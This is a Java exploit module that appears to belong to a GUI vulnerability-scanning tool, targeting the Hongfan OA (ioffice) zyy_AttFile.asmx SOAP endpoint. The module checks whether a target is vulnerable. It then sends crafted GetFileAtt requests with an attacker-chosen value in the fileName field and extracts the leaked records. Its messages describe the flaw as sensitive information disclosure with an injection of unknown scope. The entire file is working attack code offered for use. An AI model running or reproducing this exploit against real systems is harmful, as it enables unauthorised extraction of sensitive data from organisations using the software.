package exp.oa.hongfanoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class hongfan_zyy_AttFile_info implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/ioffice/prg/interface/zyy_AttFile.asmx?op=GetFileAtt" , head, "utf-8");
            if (get_res.getCode() == 200 && !get_res.getText().contains("userPwd")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongfan_zyy_AttFile_info ]");
                    textArea.appendText("\n 该漏洞为敏感信息泄露，注入范围未知，CMD处输入数字查询");
                    textArea.appendText("\n 示例语法: 100");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String num,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap head = new HashMap();
            head.put("Content-Type", "text/xml; charset=UTF-8");
            head.put("SOAPAction","\"http://tempuri.org/GetFileAtt\"");
            String xmlData = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                    "<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                    "  <soap:Body>\n" +
                    "    <GetFileAtt xmlns=\"http://tempuri.org/\">\n" +
                    "      <fileName>"+num+"</fileName>\n" +
                    "    </GetFileAtt>\n" +
                    "  </soap:Body>\n" +
                    "</soap:Envelope>";
            Response res = HttpTools.post(url + "/ioffice/prg/interface/zyy_AttFile.asmx", xmlData,head,"utf-8");
            if(res.getCode()==200 && res.getText().contains("</filename>")){

                String pattern = "<record>(.*?)</record>";
                Pattern regex = Pattern.compile(pattern);
                Matcher matcher = regex.matcher(res.getText());
                String record = "";
                while (matcher.find()) {
                    String recordTag = matcher.group(1);
                    recordTag = "\n-----------------------------------------\n"+recordTag.replaceAll("<.*?>", "\n").trim();
                    recordTag = recordTag.replaceAll("\\s+", "\n");
                    record = record+ recordTag;
                }


                String finalRecord = record+"\n-----------------------------------------\n";
                Platform.runLater(() -> {
                    textArea.appendText("\n Info: "+num+" 执行成功");
                    textArea_cmd.appendText("\n "+ finalRecord);
                });
                return true;
            }
        }catch (Exception E){
            Platform.runLater(() -> {
                textArea.appendText("\n Info: "+num+" 执行失败");
            });
            return false;
        }
        Platform.runLater(() -> {
            textArea.appendText("\n Info: "+num+" 执行失败");
        });
        return false;
    }
}
